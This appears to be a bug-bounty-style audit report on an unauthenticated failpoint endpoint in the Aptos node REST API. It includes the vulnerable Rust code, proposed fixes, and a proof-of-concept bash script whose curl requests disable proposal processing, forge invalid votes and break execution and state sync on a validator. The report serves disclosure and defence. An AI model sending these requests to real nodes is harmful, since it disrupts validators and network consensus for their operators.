# Audit Report

## Title
Unauthenticated Failpoint Configuration Endpoint Enables Cross-Tenant Consensus Disruption in Multi-Tenant Cloud Deployments

## Summary
The `/v1/set_failpoint` endpoint in the Aptos REST API lacks authentication controls, allowing any network-reachable client to inject fault conditions into critical consensus and execution paths when failpoints are enabled. In multi-tenant cloud environments with imperfect network isolation, this enables one tenant to disrupt another tenant's validator node operations.

## Finding Description

The `set_failpoint_poem()` function [1](#0-0)  accepts failpoint configuration via unauthenticated HTTP GET requests. The only security check is a configuration flag: [2](#0-1) 

The endpoint is registered without any authentication middleware: [3](#0-2) 

When nodes are deployed with `api.address: "0.0.0.0:8080"` (common in Docker/Kubernetes environments as evidenced by [4](#0-3) ) and `api.failpoints_enabled: true` (allowed on non-mainnet networks per [5](#0-4) ), the endpoint becomes network-accessible.

**Attack Propagation Path:**

1. Attacker discovers victim node IP (e.g., via network scanning in shared cloud infrastructure)
2. Attacker sends: `GET http://<victim-ip>:8080/v1/set_failpoint?name=consensus::process_proposal_msg&actions=return`
3. The failpoint configuration is applied globally via `fail::cfg()` [6](#0-5) 
4. Subsequent proposal processing fails immediately [7](#0-6) 

**Exploitable Failpoints:**

Critical consensus failpoints that can be weaponized:
- `consensus::process_proposal_msg` - blocks proposal processing [7](#0-6) 
- `consensus::create_invalid_vote` - generates cryptographically invalid votes [8](#0-7) 
- `consensus::send::any` - disrupts all consensus messaging [9](#0-8) 
- `consensus::sync_to_target` - breaks state synchronization [10](#0-9) 
- `aptos_vm::execute_script_or_entry_function` - causes transaction execution failures [11](#0-10) 

## Impact Explanation

**Severity: Medium (up to $10,000 per Aptos Bug Bounty)**

This vulnerability enables:
- **Validator node slowdowns/crashes** (High severity category) - Injecting failpoints causes validators to reject proposals, fail to vote, or produce invalid signatures
- **Consensus liveness degradation** - Affected validators cannot participate in consensus, reducing effective validator count
- **State inconsistencies** - Failpoints in execution/state sync paths can cause nodes to diverge

While this doesn't achieve Critical severity (no direct fund loss, requires specific configuration), it meets High/Medium criteria for "validator node slowdowns" and "state inconsistencies requiring intervention."

**Invariants Broken:**
1. **Consensus Liveness** - Validators must be able to process proposals and participate in voting
2. **Deterministic Execution** - Failpoints can cause execution divergence between nodes
3. **Access Control** - Critical debugging functionality should be protected from unauthorized access

## Likelihood Explanation

**Likelihood: Medium**

**Prerequisites for exploitation:**
1. Target node has `api.failpoints_enabled: true` (disabled by default but allowed on testnet/devnet per sanitizer [5](#0-4) )
2. API bound to `0.0.0.0` instead of `127.0.0.1` (common in containerized deployments as shown in [4](#0-3) )
3. Imperfect network isolation between tenants (the question's premise)

**Realistic scenarios:**
- Testnet/devnet validator nodes in cloud environments (AWS, GCP, Azure)
- Kubernetes clusters with multiple Aptos node tenants
- Development/staging environments with debugging enabled

While the configuration requirements limit exploitability, the lack of ANY authentication (no IP allowlisting, no rate limiting, no API keys) when these conditions are met represents a significant security gap.

## Recommendation

Implement defense-in-depth controls for the failpoint endpoint:

**1. Add authentication middleware:**
```rust
// In api/src/runtime.rs, modify the failpoint route registration:
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .with(RequireAuthToken::new()) // Add authentication
        .data(context.clone()),
)
```

**2. Add IP allowlist configuration:**
```rust
// In config/src/config/api_config.rs, add field:
pub struct ApiConfig {
    // ... existing fields ...
    #[serde(default)]
    pub failpoint_allowed_ips: Vec<IpAddr>,
}

// In api/src/set_failpoints.rs, check allowlist:
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
    remote_addr: &RemoteAddr,
) -> poem::Result<String> {
    // Check IP allowlist
    if !context.is_failpoint_ip_allowed(remote_addr.0.ip()) {
        return Err(poem::Error::from_status(StatusCode::FORBIDDEN));
    }
    // ... rest of function
}
```

**3. Add rate limiting:**
Apply the same rate limiting mechanisms used by the faucet to prevent abuse.

**4. Documentation:**
Add prominent security warnings in configuration documentation about exposing failpoints on network-accessible APIs.

## Proof of Concept

**Setup (Victim Node):**
```yaml
# fullnode.yaml configuration
api:
  enabled: true
  address: "0.0.0.0:8080"
  failpoints_enabled: true  # Enabled for testing
```

**Attack (From Attacker Node/Container):**
```bash
#!/bin/bash
# Attacker discovers victim node at 10.0.1.100 in shared cloud network

# Attack 1: Disable proposal processing
curl "http://10.0.1.100:8080/v1/set_failpoint?name=consensus::process_proposal_msg&actions=return"
# Result: Victim validator stops processing proposals, cannot participate in consensus

# Attack 2: Generate invalid votes
curl "http://10.0.1.100:8080/v1/set_failpoint?name=consensus::create_invalid_vote&actions=return"
# Result: Victim validator produces cryptographically invalid votes, excluded from quorum

# Attack 3: Break execution
curl "http://10.0.1.100:8080/v1/set_failpoint?name=aptos_vm::execute_script_or_entry_function&actions=return"
# Result: All transaction execution fails, validator cannot commit blocks

# Attack 4: Disrupt state sync
curl "http://10.0.1.100:8080/v1/set_failpoint?name=consensus::sync_to_target&actions=return"
# Result: Victim node cannot sync to chain tip, falls behind permanently
```

**Verification:**
```bash
# Check victim node logs - will show injected errors:
# "Injected error in process_proposal_msg"
# "Injected error in sync_to_target"

# Check consensus metrics - victim validator will:
# - Stop voting on proposals
# - Fail to produce valid signatures
# - Drop out of active validator set
```

---

**Notes:**

This vulnerability is particularly concerning because:
1. The default configuration is safe (`127.0.0.1`, failpoints disabled), but legitimate use cases (Docker/K8s deployments, testing environments) create the attack surface
2. There is no graduated security model - once enabled, the endpoint is completely unprotected
3. The impact is immediate and severe - a single unauthenticated request can disable a validator
4. The sanitizer only prevents mainnet exposure [5](#0-4) , leaving testnet/devnet vulnerable

While this requires specific configuration to exploit, the complete absence of authentication for such a powerful debugging interface represents a security design flaw that should be addressed with defense-in-depth controls.

### Citations

**File:** api/src/set_failpoints.rs (L23-40)
```rust
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** docker/compose/aptos-node/fullnode.yaml (L31-33)
```yaml
api:
  enabled: true
  address: "0.0.0.0:8080"
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```

**File:** consensus/src/round_manager.rs (L727-729)
```rust
        fail_point!("consensus::process_proposal_msg", |_| {
            Err(anyhow::anyhow!("Injected error in process_proposal_msg"))
        });
```

**File:** consensus/src/round_manager.rs (L1369-1378)
```rust
        fail_point!("consensus::create_invalid_vote", |_| {
            use aptos_crypto::bls12381;
            let faulty_vote = Vote::new_with_signature(
                vote.vote_data().clone(),
                vote.author(),
                vote.ledger_info().clone(),
                bls12381::Signature::dummy_signature(),
            );
            Ok(faulty_vote)
        });
```

**File:** consensus/src/network.rs (L283-285)
```rust
        fail_point!("consensus::send::any", |_| {
            Err(anyhow::anyhow!("Injected error in request_block"))
        });
```

**File:** consensus/src/state_computer.rs (L207-209)
```rust
        fail_point!("consensus::sync_to_target", |_| {
            Err(anyhow::anyhow!("Injected error in sync_to_target").into())
        });
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1032-1038)
```rust
        fail_point!("aptos_vm::execute_script_or_entry_function", |_| {
            Err(VMStatus::Error {
                status_code: StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR,
                sub_status: Some(move_core_types::vm_status::sub_status::unknown_invariant_violation::EPARANOID_FAILURE),
                message: None,
            })
        });
```
